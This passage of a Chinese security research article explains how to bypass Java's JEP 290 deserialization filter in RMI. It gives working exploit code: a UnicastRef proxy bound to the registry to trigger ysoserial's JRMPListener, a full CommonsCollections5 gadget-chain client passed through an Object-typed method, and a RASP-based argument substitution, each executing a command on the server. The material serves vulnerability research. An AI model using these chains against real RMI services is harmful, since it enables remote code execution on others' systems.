                    } else {
                        return var0.arrayLength() >= 0L && var0.arrayLength() > 1000000L ? Status.REJECTED : Status.UNDECIDED;
                    }
                } else {
                    return Status.UNDECIDED;
                }
            }
        }
白名单列表:
  * String.class
  * Number.class
  * Remote.class
  * Proxy.class
  * UnicastRef.class
  * RMIClientSocketFactory.class
  * RMIServerSocketFactory.class
  * ActivationID.class
  * UID.class
调用栈
    registryFilter:427, RegistryImpl (sun.rmi.registry)
    checkInput:-1, 2059904228 (sun.rmi.registry.RegistryImpl$$Lambda$2)
    filterCheck:1239, ObjectInputStream (java.io)
    readProxyDesc:1813, ObjectInputStream (java.io)
    readClassDesc:1748, ObjectInputStream (java.io)
    readOrdinaryObject:2042, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    readObject:431, ObjectInputStream (java.io)
    dispatch:76, RegistryImpl_Skel (sun.rmi.registry)
    oldDispatch:468, UnicastServerRef (sun.rmi.server)
    dispatch:300, UnicastServerRef (sun.rmi.server)
    run:200, Transport$1 (sun.rmi.transport)
    run:197, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:196, Transport (sun.rmi.transport)
    handleMessages:573, TCPTransport (sun.rmi.transport.tcp)
    run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 714624149 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)
    doPrivileged:-1, AccessController (java.security)
    run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)
#### UnicastRef对象
用UnicastRef对象新建一个RMI连接绕过JEP290的限制,看下ysoserial的JRMPClient的payload
这几行代码会向指定的RMI
Registry发起请求,并且在白名单列表里面,在看下服务端和客户端调用LocateRegistry.getRegistry方法的代码。
代码位置`java.rmi.registry#getRegistry`
和payload发起RMI Registry请求代码是一样的。
先用ysoserial启动RMI registry`java -cp ysoserial-0.0.6-SNAPSHOT-all.jar
ysoserial.exploit.JRMPListener 1099 CommonsCollections5 "open
/Applications/Calculator.app"`
然后把这个payload放在服务端bind看下
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
                TCPEndpoint te = new TCPEndpoint("127.0.0.1", 1199);
                UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
                RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
                Registry proxy = (Registry) Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]{
                        Registry.class
                }, obj);
                registry.bind("hello", proxy);
在服务端执行RMI registry的计算器就弹出来了,debug RMI registry代码看下.
调用栈
    read:291, LiveRef (sun.rmi.transport)
    readExternal:489, UnicastRef (sun.rmi.server)
    readObject:455, RemoteObject (java.rmi.server)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeReadObject:1170, ObjectStreamClass (java.io)
    readSerialData:2178, ObjectInputStream (java.io)
    readOrdinaryObject:2069, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    defaultReadFields:2287, ObjectInputStream (java.io)
    readSerialData:2211, ObjectInputStream (java.io)
    readOrdinaryObject:2069, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    readObject:431, ObjectInputStream (java.io)
    dispatch:76, RegistryImpl_Skel (sun.rmi.registry)
    oldDispatch:468, UnicastServerRef (sun.rmi.server)
    dispatch:300, UnicastServerRef (sun.rmi.server)
    run:200, Transport$1 (sun.rmi.transport)
    run:197, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:196, Transport (sun.rmi.transport)
    handleMessages:573, TCPTransport (sun.rmi.transport.tcp)
    run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 168016515 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)
    doPrivileged:-1, AccessController (java.security)
    run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)
原理就是利用在白名单的UnicastRef类来发起一个RMI连接,在高版本jdk下ysoserial的JRMPListener依然可以利用.
#### 用Object绕JEP290限制
JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器,在RMI客户端和服务端在通信时参数传递这块是没有做处理的,而参数传递也是基于序列化数据传输,那么如果参数是泛型的payload,传输依然会有问题。
先把接口都新增一个sayPayload的方法,参数都是Object类型的
    import java.rmi.Remote;
    public interface HelloInterface extends java.rmi.Remote {
        public String sayHello(String from) throws java.rmi.RemoteException;
        public Object sayPayload(Object from) throws java.rmi.RemoteException;
    }
在把服务端HelloImpl代码改下,去实现这个方法。
    import java.rmi.server.UnicastRemoteObject;
    public class HelloImpl extends UnicastRemoteObject implements HelloInterface {
        public HelloImpl() throws java.rmi.RemoteException {
            super();
        }
        public String sayHello(String from) throws java.rmi.RemoteException {
            System.out.println("Hello from " + from + "!!");
            return "sayHello";
        }
        public Object sayPayload(Object from) throws java.rmi.RemoteException {
            System.out.println("Hello from " + from + "!!");
            return null;
        }
    }
客户端在调用这个sayPayload方法时直接传payload看下
    public class HelloClient {
        public static void main(String[] args) {
            try {
                Registry registry = LocateRegistry.getRegistry(1099);
                HelloInterface hello = (HelloInterface) registry.lookup("hello1");
                Transformer[] transformers = new Transformer[]{
                        new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod",
                                new Class[]{String.class, Class[].class},
                                new Object[]{"getRuntime", new Class[0]}),
                        new InvokerTransformer("invoke",
                                new Class[]{Object.class, Object[].class},
                                new Object[]{null, new Object[0]}),
                        new InvokerTransformer("exec",
                                new Class[]{String.class},
                                new Object[]{"open /Applications/Calculator.app"})
                };
                Transformer transformerChain = new ChainedTransformer(transformers);
                Map innerMap = new HashMap();
                Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
                TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
                BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
                Field valfield = poc.getClass().getDeclaredField("val");
                valfield.setAccessible(true);
                valfield.set(poc, entry);
                hello.sayPayload(poc);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
执行后服务端计算器直接弹出,如果把这个payload作为sayPayload方法的返回值 客户端计算器也会弹出。
看下反序列化的地方
`sun.rmi.server.UnicastRef#marshalValue`
调用栈
    marshalValue:290, UnicastRef (sun.rmi.server)
    dispatch:367, UnicastServerRef (sun.rmi.server)
    run:200, Transport$1 (sun.rmi.transport)
    run:197, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:196, Transport (sun.rmi.transport)
    handleMessages:573, TCPTransport (sun.rmi.transport.tcp)
    run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 316535884 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)
    doPrivileged:-1, AccessController (java.security)
    run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)
在实际使用场景很少有参数是Object类型的,而攻击者可以完全操作客户端,因此可以用恶意对象替换从Object类派生的参数(例如String),具体有如下四种bypass的思路
  * 将java.rmi包的代码复制到新包，并在新包中修改相应的代码
  * 将调试器附加到正在运行的客户端，并在序列化之前替换这些对象
  * 使用诸如Javassist这样的工具修改字节码
  * 通过实现代理替换网络流上已经序列化的对象
我这里使用第三个方法,由afanti师傅实现的通过RASP
hook住`java.rmi.server.RemoteObjectInvocationHandler`类的InvokeRemoteMethod方法的第三个参数非Object的改为Object的gadget。不熟悉RASP的先要去了解下。
我这里使用CommonsCollections5这条链,Hook invokeRemoteMethod函数。
客户端代码还是不变
    public class Client {
        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
            HelloInterface hello = ( HelloInterface ) registry.lookup("hello1");
            hello.sayHello("xxx");
        }
    }
VM options参数填写rasp jar对应的地址
然后直接运行
控制台会抛出一个错误 随后计算器也直接弹出来了.
debug看下可以看到
`java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod`这里args参数的值已经修改为CommonsCollections5的gadget了.
### 五、总结
RMI数据传输都是基于序列化数据传输,RMI Registry、Client、Server都能相互攻击,在你攻击别人的时候 可能也会被人攻击。
### 参考链接
  1. 
  2. 
  3. 
  4. 
* * *